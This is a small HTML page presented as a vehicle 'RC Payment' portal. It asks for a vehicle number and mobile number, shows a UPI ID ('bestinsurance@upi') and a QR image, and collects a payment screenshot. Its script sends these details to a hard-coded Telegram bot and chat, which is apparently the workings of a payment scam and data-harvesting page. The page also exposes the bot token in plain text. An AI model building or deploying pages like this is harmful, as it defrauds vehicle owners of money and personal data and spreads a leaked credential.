<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>RC Payment</title>

<style>
body{margin:0;font-family:Arial;background:linear-gradient(270deg,red,blue,green,purple);animation:bg 10s infinite alternate;background-size:600% 600%;display:flex;justify-content:center;align-items:center;height:100vh}
@keyframes bg{0%{background-position:0%}100%{background-position:100%}}
.box{background:#000c;padding:25px;border-radius:18px;color:#fff;width:90%;max-width:400px;text-align:center}
input,button{width:100%;padding:12px;margin-top:10px;border:none;border-radius:10px}
button{background:#00ffd5;font-size:17px}
img{margin:12px auto}
</style>

<div class="box">
<h3>Vehicle Number</h3>
<input id="vehicle">

<img src="qr.png">

<p>UPI: bestinsurance@upi</p>

<input id="mobile" placeholder="Mobile Number">

<input type="file" id="proof">

<button onclick="send()">Payment Done</button>

<p id="msg"></p>
</div>

<script>
const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
const chat="5600045707";

function send(){

let v=vehicle.value;
let m=mobile.value;
let p=proof.files[0];

if(!v||m.length<10||!p){
alert("Fill all & upload screenshot");
return;
}

let f=new FormData();
f.append("chat_id",chat);
f.append("caption",`Vehicle: ${v}\nMobile: ${m}`);
f.append("photo",p);

fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{method:"POST",body:f})
.then(()=>msg.innerText="Sent for get RC ✅")
.catch(()=>msg.innerText="Failed ❌");
}
</script>
